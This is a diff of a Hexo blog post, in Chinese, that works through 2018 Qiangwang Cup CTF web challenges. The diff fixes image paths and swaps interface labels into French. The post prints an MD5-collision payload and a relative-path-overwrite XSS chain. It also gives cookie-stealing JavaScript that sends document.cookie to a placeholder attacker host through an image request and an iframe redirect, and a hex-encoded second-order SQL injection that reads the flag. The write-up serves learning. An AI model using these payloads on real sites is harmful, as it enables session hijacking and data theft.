@@ -86,14 +86,14 @@
 <meta property="og:url" content="http://yoursite.com/2018/04/02/网强杯wp的学习/index.html">
 <meta property="og:site_name" content="Ratten3anger">
 <meta property="og:description" content="强网杯的题目确实质量很高，把我按在光滑的地上摩擦~那个星期去打球去了，所以也没怎么研究。这会乘有空，把l3m0n师傅的wp拿来看看 0x01考点:md5比较缺陷这个签到题有三关，前两关传数组payloadparam1p[]=1&amp;amp;param2[]=a即可，二者返回均为0，绕过来到第三关，贴上源码:123if((string)$_POST[&apos;param1&apos;]!==(string)$_POST[">
-<meta property="og:image" content="http://yoursite.com/E:/ratten3anger.github.io/source/Share%20your%20mind1.png">
-<meta property="og:image" content="http://yoursite.com/E:/ratten3anger.github.io/source/share%20your%20mind3.png">
-<meta property="og:image" content="http://yoursite.com/img%20src=%22E:/ratten3anger.github.io/source/Three%20hit.jpg">
-<meta property="og:updated_time" content="2018-04-10T14:37:06.131Z">
+<meta property="og:image" content="http://yoursite.com/Share%20your%20mind1.png">
+<meta property="og:image" content="http://yoursite.com/share%20your%20mind3.png">
+<meta property="og:image" content="http://yoursite.com/Three%20hit.jpg">
+<meta property="og:updated_time" content="2018-04-10T14:42:14.930Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网强杯wp数题的学习">
 <meta name="twitter:description" content="强网杯的题目确实质量很高，把我按在光滑的地上摩擦~那个星期去打球去了，所以也没怎么研究。这会乘有空，把l3m0n师傅的wp拿来看看 0x01考点:md5比较缺陷这个签到题有三关，前两关传数组payloadparam1p[]=1&amp;amp;param2[]=a即可，二者返回均为0，绕过来到第三关，贴上源码:123if((string)$_POST[&apos;param1&apos;]!==(string)$_POST[">
-<meta name="twitter:image" content="http://yoursite.com/E:/ratten3anger.github.io/source/Share%20your%20mind1.png">
+<meta name="twitter:image" content="http://yoursite.com/Share%20your%20mind1.png">
 
 
 
@@ -189,7 +189,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Home
+            Accueil
           </a>
         </li>
       
@@ -263,7 +263,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Posted on</span>
+                <span class="post-meta-item-text">Posté le</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-02T20:26:19+08:00">
                 2018-04-02
@@ -308,11 +308,11 @@
 <p>要求MD5后的两字段需要完全相等（大小，数据类型）<br>参见这两盘文献：<a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="noopener">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a><br><a href="https://www.mscs.dal.ca/~selinger/md5collision/" target="_blank" rel="noopener">https://www.mscs.dal.ca/~selinger/md5collision/</a><br>即山东大学两教授研究出的hash collision<br>所以经过转码后，最终的payload:<br><code>&quot;param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;</code></p>
 <h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>Share your mind</strong><br>题目描述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please help me find the vulnerability before I finish this site！</span><br><span class="line">hint：xss bot使用phantomjs，版本2.1.1</span><br><span class="line">hint2 : xss的点不在report页面</span><br></pre></td></tr></table></figure></p>
 <p>login后，Reports这里存在一个PS:<code>substr(\(md5($code),0,6) === &#39;21b495&#39;</code><br>意为MD5后前缀为21b495的数，使用脚本穷举<br>脚本如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>	</span><br><span class="line">$code = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(substr(md5($code),<span class="number">0</span>,<span class="number">6</span>)==<span class="string">'21b495'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $code;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$code++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>.md5($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>打开页面源文件:<br><img src="/E:\ratten3anger.github.io\source\Share your mind1.png" alt=""><br>在请求外部jQuery的时候没有”/“来限制，故存在rpo漏洞(相对路径覆盖漏洞)<br>关于rpo漏洞，简而言之，就是由于服务器和浏览器的解码，造成服务器和浏览器差异，从而导致页面中引用文件 使用相对路径时出错。服务器便将访问地址回滚到本域中。利用这样的一个特性，我们可以加载服务器上面任意的文件，只要页面受我们控制，我们就可以注入进去数据。<br>有时间的时候我也来写写这个洞的复现和利用(小声bb)<br>可参考文献：l3m0n师傅的blog:<a href="http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html</a><br>phorse师傅的page:<a href="https://xz.aliyun.com/t/2220" target="_blank" rel="noopener">https://xz.aliyun.com/t/2220</a><br>payload:<code>http://39.107.33.96:20000/index.php/view/article/784/%2f..%2f..%2f..%2f..%2f</code><br>%2f指反斜杠，即：<code>http://39.107.33.96:20000/index.php/view/article/784/\..\..\..\..\</code><br>这里便使得其回滚四层到index.php,然后就可以弹出自己的VPNip，也就找到了注入点。把<code>http://39.107.33.96:20000/index.php/view/article/36967</code>的页面内容，也就是alert(1)当做是js文件的内容，带回到了script标签中，也就因此，造成了XSS漏洞。<br>完成过程：先填写一个只有内容，没有标题的Ideas<br><img src="/E:\ratten3anger.github.io\source\share your mind3.png" alt=""><br>那请求的结果将含有HTML代码，如果这个时候再把返回的数据当做是JavaScript代码解析，就会发生异常</p>
+<p>打开页面源文件:<br><img src="/Share your mind1.png" alt=""><br>在请求外部jQuery的时候没有”/“来限制，故存在rpo漏洞(相对路径覆盖漏洞)<br>关于rpo漏洞，简而言之，就是由于服务器和浏览器的解码，造成服务器和浏览器差异，从而导致页面中引用文件 使用相对路径时出错。服务器便将访问地址回滚到本域中。利用这样的一个特性，我们可以加载服务器上面任意的文件，只要页面受我们控制，我们就可以注入进去数据。<br>有时间的时候我也来写写这个洞的复现和利用(小声bb)<br>可参考文献：l3m0n师傅的blog:<a href="http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html</a><br>phorse师傅的page:<a href="https://xz.aliyun.com/t/2220" target="_blank" rel="noopener">https://xz.aliyun.com/t/2220</a><br>payload:<code>http://39.107.33.96:20000/index.php/view/article/784/%2f..%2f..%2f..%2f..%2f</code><br>%2f指反斜杠，即：<code>http://39.107.33.96:20000/index.php/view/article/784/\..\..\..\..\</code><br>这里便使得其回滚四层到index.php,然后就可以弹出自己的VPNip，也就找到了注入点。把<code>http://39.107.33.96:20000/index.php/view/article/36967</code>的页面内容，也就是alert(1)当做是js文件的内容，带回到了script标签中，也就因此，造成了XSS漏洞。<br>完成过程：先填写一个只有内容，没有标题的Ideas<br><img src="/share your mind3.png" alt=""><br>那请求的结果将含有HTML代码，如果这个时候再把返回的数据当做是JavaScript代码解析，就会发生异常</p>
 <p>获取当前根目录的cookie:<br><code>b=document.cookie;a=&quot;&lt;img src=//ip/&quot;+btoa(b)+&quot;&gt;&quot;;document.write(a);</code>        //还不太明白btoa函数是干什么的…<br>或者使用<code>(new Image()).src = &#39;http://VPSIP:Port?&#39;+document.cookie</code><br>因为注入点过滤了引号，所以可以用fromCharCode进行绕过处理</p>
 <p>打回来的数据提示<code>Try to get the cookie of path &quot;/QWB_fl4g/QWB/&quot;</code>，也就是要获取不同目录下的cookie。可以通过iframe来加载，最后来获取iframe里面的cookie。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">i.setAttribute(<span class="string">"src"</span>, <span class="string">"/QWB_fl4g/QWB/"</span>);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(i);</span><br><span class="line">i.addEventListener( <span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> content = i.contentWindow.document.cookie;</span><br><span class="line">  location=<span class="string">'//ip/'</span>+btoa(content);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line">		<span class="comment">//这个脚本看不太懂...</span></span><br></pre></td></tr></table></figure></p>
 <p>最后可在此路径得到flag.</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>Three hit</strong><br>注册时要求age而登陆后提示调用了age，所以是二次注入<br>对age输入限制为数字，所以hex一下：<br><img src="/img src=&quot;E:\ratten3anger.github.io\source\Three hit.jpg" alt=""><br>获取flag的payload:<br><figure class="highlight plain"><figcaption><span>/index.php?func</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host: 39.107.32.29:10000</span><br><span class="line"></span><br><span class="line">username=ratten3anger&amp;age=0x393939393939393939393939393920756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167206c696d697420302c31292c332c34206c696d697420382c312d2d&amp;password=123456</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>Three hit</strong><br>注册时要求age而登陆后提示调用了age，所以是二次注入<br>对age输入限制为数字，所以hex一下：<br><img src="/Three hit.jpg" alt=""><br>获取flag的payload:<br><figure class="highlight plain"><figcaption><span>/index.php?func</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host: 39.107.32.29:10000</span><br><span class="line"></span><br><span class="line">username=ratten3anger&amp;age=0x393939393939393939393939393920756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167206c696d697420302c31292c332c34206c696d697420382c312d2d&amp;password=123456</span><br></pre></td></tr></table></figure></p>
 <p>自分が信じることは、必ずできられ見せます。</p>
 
       
@@ -410,10 +410,10 @@
       
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
+            Table Des Matières
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
+            Ensemble
           </li>
         </ul>
       
@@ -434,7 +434,7 @@
                 <a href="/archives/">
               
                   <span class="site-state-item-count">5</span>
-                  <span class="site-state-item-name">posts</span>
+                  <span class="site-state-item-name">articles</span>
                 </a>
               </div>
             
@@ -539,7 +539,7 @@
 
 
 
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+  <div class="theme-info">Thème &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
 
 
 
